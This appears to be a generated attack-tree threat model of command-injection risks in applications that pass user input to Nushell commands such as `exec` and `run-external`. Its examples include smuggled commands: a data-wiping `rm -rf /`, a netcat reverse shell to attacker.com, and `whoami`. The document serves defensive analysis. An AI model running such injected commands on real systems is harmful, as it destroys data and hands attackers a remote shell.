# Attack Tree Analysis for nushell/nushell

Objective: To achieve Remote Code Execution (RCE) on the application server or gain unauthorized access to sensitive data by exploiting vulnerabilities or weaknesses inherent in Nushell's functionalities when used within the application.

## Attack Tree Path: [1. Compromise Application Using Nushell [CRITICAL NODE]](./attack_tree_paths/1__compromise_application_using_nushell__critical_node_.md)

*   **Description:** This is the root goal of the attacker. It represents the overall objective to successfully compromise the application that utilizes Nushell.
*   **Why Critical:**  Success at this node means the attacker has achieved their ultimate goal, potentially leading to severe consequences for the application and its users.
*   **Mitigation Focus:** All mitigations in the subsequent nodes contribute to preventing the attacker from reaching this goal.

## Attack Tree Path: [2. Exploit Nushell Vulnerabilities [CRITICAL NODE]](./attack_tree_paths/2__exploit_nushell_vulnerabilities__critical_node_.md)

*   **Description:** This critical node represents the attacker's strategy of targeting vulnerabilities specifically within Nushell or its integration within the application.
*   **Why Critical:** Focusing on Nushell-specific vulnerabilities is a direct and potentially impactful attack vector.
*   **Mitigation Focus:** Secure coding practices when using Nushell, input sanitization, and staying updated with Nushell security patches are crucial.

## Attack Tree Path: [3. Command Injection [CRITICAL NODE] [HIGH RISK PATH]](./attack_tree_paths/3__command_injection__critical_node___high_risk_path_.md)

*   **Description:** This is the most critical attack path. It involves injecting malicious commands that are then executed by the underlying operating system through Nushell.
*   **Why High Risk:**
    *   **High Impact:** Successful command injection can lead to Remote Code Execution (RCE), allowing the attacker to completely control the server, steal sensitive data, install malware, and more.
    *   **Moderate Likelihood:** If input sanitization is not rigorously implemented, this vulnerability is relatively easy to introduce and exploit.
    *   **Low Skill Level:** Basic command injection attacks can be carried out by attackers with limited scripting skills.
*   **Attack Vectors within Command Injection:**
    *   **Unsanitized Input to Nushell Commands [CRITICAL NODE] [HIGH RISK PATH]:**
        *   **Description:** The core vulnerability enabling command injection. Occurs when user-provided input or data from external sources is directly used to construct or execute Nushell commands without proper sanitization or validation.
        *   **Attack Vectors:**
            *   **User-Provided Input [HIGH RISK PATH]:**
                *   **Web Form Input [HIGH RISK PATH]:** Attackers inject malicious commands through web form fields that are processed by Nushell.
                    *   **Example:** A form field intended for a filename could be exploited with input like `; rm -rf /`.
                *   **API Parameters [HIGH RISK PATH]:** Attackers inject malicious commands through API parameters that are processed by Nushell.
                    *   **Example:** An API endpoint expecting a file path could be exploited with input like `; netcat attacker.com 4444 -e /bin/bash`.
    *   **Vulnerable Nushell Commands/Features [CRITICAL NODE] [HIGH RISK PATH]:**
        *   **Description:**  Certain Nushell commands, especially those designed to interact with the operating system, are inherently risky if used with untrusted input.
        *   **Attack Vectors:**
            *   **`exec`, `run-external`, `os-command` (and similar commands) [CRITICAL NODE] [HIGH RISK PATH]:**
                *   **Misuse leading to command injection [HIGH RISK PATH]:**  Directly using these commands with unsanitized input is a primary source of command injection vulnerabilities.
                    *   **Example:**  `exec $"ls ($userInput)"` where `$userInput` is not sanitized. An attacker could input `; whoami` to execute the `whoami` command.
